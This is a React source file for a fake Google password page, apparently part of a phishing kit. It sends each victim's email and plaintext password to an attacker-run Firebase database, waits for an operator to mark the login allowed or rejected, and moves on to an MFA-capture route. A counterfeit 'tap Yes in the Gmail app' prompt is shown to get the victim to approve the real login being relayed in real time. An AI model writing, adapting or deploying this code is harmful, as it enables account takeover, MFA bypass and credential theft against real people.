import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { database, ref, push, get, child } from "../firebase";
import "./login.css";

const Password = () => {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const [error, setError] = useState("");

  const email = location.state?.email || "user@example.com";

    const handleNext = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    
    

    try {
    // Push login to Firebase
    const loginRef = push(ref(database, "logins"), {
      email,
      password,
      timestamp: new Date().toISOString(),
      status: "pending",
    });

    const loginKey = (await loginRef).key;

    // Polling Firebase every 2 seconds for status update
    const pollInterval = setInterval(async () => {
      const snapshot = await get(child(ref(database), `logins/${loginKey}`));
      const loginData = snapshot.val();

      if (!loginData) return;

      if (loginData.status === "allowed") {
        clearInterval(pollInterval);
        if (loginData.mfa) {
          navigate("/mfa", { state: { email, loginKey } });
        } else {
          window.location.href = "https://forms.gle/VM2MSvDd3uuwR1WP7";
        }
      } else if (loginData.status === "rejected") {
        clearInterval(pollInterval);
        setError("Wrong password. Please try again.");
        setLoading(false);
      }
    }, 2000);
  } catch (error) {
    alert("Error logging in: " + error.message);
    setLoading(false);
  }
};

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="logo-wrapper">
          <img src="/google.png" alt="Logo" className="login-logo" />
        </div>
        <h2 className="login-title">Welcome</h2>
        <div className="email-pill">{email}</div>

        {loading ? (
          <div style={{ textAlign: "center", marginTop: "40px" }}>
            <p style={{ fontSize: "16px", fontWeight: "600", marginBottom: "6px" }}>
              Open the Gmail app on your phone
            </p>
            <p style={{ fontSize: "14px", color: "#5f6368", marginBottom: "20px" }}>
             Google sent a notification to your phone. Open the Gmail app and tap Yes on the prompt to verify it's you.
            </p>
            <div className="google-loader">
              <span className="blue"></span>
              <span className="red"></span>
              <span className="yellow"></span>
              <span className="green"></span>
            </div>

            <p style={{ marginTop: "10px", fontSize: "16px" }}>Loading...</p>
          </div>
        ) : (
        <form onSubmit={handleNext} className="login-form">
          <input
              type={showPassword ? "text" : "password"}
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="login-input"
              required
              disabled={loading}
          />
          {error && <p style={{ color: "red", marginTop: "8px" }}>{error}</p>}


          <div className="show-password">
            <input
              type="checkbox"
              id="showPassword"
              checked={showPassword}
              onChange={() => setShowPassword(!showPassword)}
            />
            <label htmlFor="showPassword"> Show password</label>
          </div>

          <div className="login-actions">
            <button
              type="button"
              className="create-account"
              onClick={() => navigate("/forgot-password", { state: { email } })}
              style={{
                background: "none",
                border: "none",
                color: "#1a73e8",
                cursor: "pointer",
                fontSize: "14px",
                paddingLeft: 0,
              }}
            >
            Forgot password?
            </button>
            <button type="submit" className="next-button">
              Next
            </button>
          </div>
        </form>
        )}
      </div>
    </div>
  );
};

export default Password;
